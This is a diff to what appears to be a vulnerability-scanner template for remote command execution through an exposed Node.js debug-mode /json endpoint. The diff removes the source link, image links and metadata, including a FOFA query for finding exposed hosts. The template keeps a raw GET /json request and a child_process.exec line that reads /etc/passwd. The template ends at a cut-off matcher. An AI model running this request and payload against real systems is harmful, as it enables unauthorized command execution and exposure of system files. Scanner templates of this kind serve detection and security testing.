@@ -3,12 +3,8 @@ info:
   name: Node.js调试模式Json存在任意命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/czwl6pgb2rcxvema'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: czwl6pgb2rcxvema
-    fofa: body="WebSockets request was expected"
 http:
 - raw:
   - 'GET /json HTTP/1.1
@@ -16,17 +12,11 @@ http:
     Host: {{Hostname}}
 
 
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1757831028686-64430869-92d1-4bae-a00a-1bee1c36e045.png)
-
-
     访问泄露的快捷链地址
 
     执行
 
-    require("child_process").exec("cat /etc/passwd", (err,std) => console.log(std))
-
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1757831028897-23f8d65a-a1b4-4ba1-8358-0f6acba88585.png)'
+    require("child_process").exec("cat /etc/passwd", (err,std) => console.log(std))'
   redirects: false
   matchers:
   - status:
